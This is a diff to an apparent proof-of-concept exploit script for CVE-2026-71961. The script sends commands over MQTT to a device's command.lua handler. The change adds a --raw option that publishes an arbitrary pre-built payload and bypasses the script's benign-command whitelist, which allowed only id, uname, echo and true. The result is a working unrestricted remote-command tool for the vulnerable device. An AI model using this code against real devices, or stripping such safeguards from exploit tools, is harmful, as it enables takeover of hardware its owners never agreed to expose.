@@ -80,6 +80,9 @@ def main():
     ap.add_argument("--cmd", default=None,
                     help="command string for command.lua (CVE-2026-71961). "
                          "Adds a trailing NUL. Use ONLY on hardware you own.")
+    ap.add_argument("--raw", action="store_true",
+                    help="publish a pre-built broker payload (a JSON envelope plus the trailing "
+                         "NUL) verbatim; skips the benign-command whitelist and is for --cmd")
     ap.add_argument("--listen", type=int, default=20, help="seconds to listen")
     args = ap.parse_args()
 
@@ -111,14 +114,20 @@ def main():
         sys.exit(1)
 
     if args.cmd:
-        if not args.cmd.startswith(("id", "uname", "echo", "true")):
+        # --raw publishes a pre-built JSON envelope verbatim (plus the trailing NUL the C side
+        # sniffs for) and skips the whitelist. box-provision.sh --cmd uses it for the lane's own
+        # steps; the default --cmd path stays benign-only.
+        if args.raw:
+            payload = args.cmd.encode() + b"\x00"
+        elif not args.cmd.startswith(("id", "uname", "echo", "true")):
             print("[!] refusing to run non-benign commands - edit the whitelist "
                   "in your own copy if you truly own the target")
             c.loop_stop()
             sys.exit(1)
+        else:
+            payload = json.dumps({"cmd": args.cmd, "reply": 1}).encode() + b"\x00"
         topic = CMD_TOPIC_FMT.format(controller=args.controller,
                                      satellite=args.satellite, seq=args.seq)
-        payload = json.dumps({"cmd": args.cmd, "reply": 1}).encode() + b"\x00"
         print(f"[*] publishing (CVE-2026-71961): {topic} {payload!r}")
         c.publish(topic, payload)
 
